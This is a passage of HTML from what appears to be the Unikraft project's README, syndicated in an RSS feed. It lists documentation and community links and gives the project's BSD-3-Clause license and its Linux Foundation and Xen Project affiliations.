<p dir="auto">Afterwards, navigate to the <a href="https://unikraft.org/docs/contributing/unikraft" rel="nofollow">contributing guide</a> to get started.
See also <a href="https://unikraft.org/docs/contributing/coding-conventions" rel="nofollow">Unikraft's coding conventions</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Additional resources</h2><a id="user-content-additional-resources" aria-label="Permalink: Additional resources" href="#additional-resources"></a></p>
<ul dir="auto">
<li><a href="http://unikraft.org/docs/getting-started" rel="nofollow">Quick-start guide</a></li>
<li><a href="https://unikraft.org/docs/concepts/" rel="nofollow">What is a unikernel?</a></li>
<li><a href="https://unikraft.org/docs/features/security/" rel="nofollow">Unikraft's inherent security benefits</a></li>
<li><a href="https://unikraft.org/docs/features/performance/" rel="nofollow">Performance of Unikraft</a></li>
<li><a href="https://unikraft.org/docs/features/posix-compatibility" rel="nofollow">POSIX-compatibility with Unikraft</a></li>
<li><a href="https://unikraft.org/docs/features/green/" rel="nofollow">Energy efficiency with Unikraft</a></li>
<li><a href="https://unikraft.org/community" rel="nofollow">Unikraft Community</a></li>
<li><a href="https://unikraft.org/docs" rel="nofollow">Unikraft Documentation</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Unikraft Open-Source Project source code and its affiliated projects source code is licensed under a <code>BSD-3-Clause</code> if not otherwise stated.
For more information, please refer to <a href="https://github.com/unikraft/unikraft/blob/staging/COPYING.md"><code>COPYING.md</code></a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Affiliation</h2><a id="user-content-affiliation" aria-label="Permalink: Affiliation" href="#affiliation"></a></p>
<p dir="auto">Unikraft is a member of the <a href="https://www.linuxfoundation.org/" rel="nofollow">Linux Foundation</a> and is a <a href="https://xenproject.org/" rel="nofollow">Xen Project</a>  Incubator Project.
The Unikraft name, logo and its mascot are trademark of <a href="https://unikraft.io/" rel="nofollow">Unikraft GmbH</a>.</p>
<br>

</article></div></div>]]></description>
        </item>
    </channel>
</rss>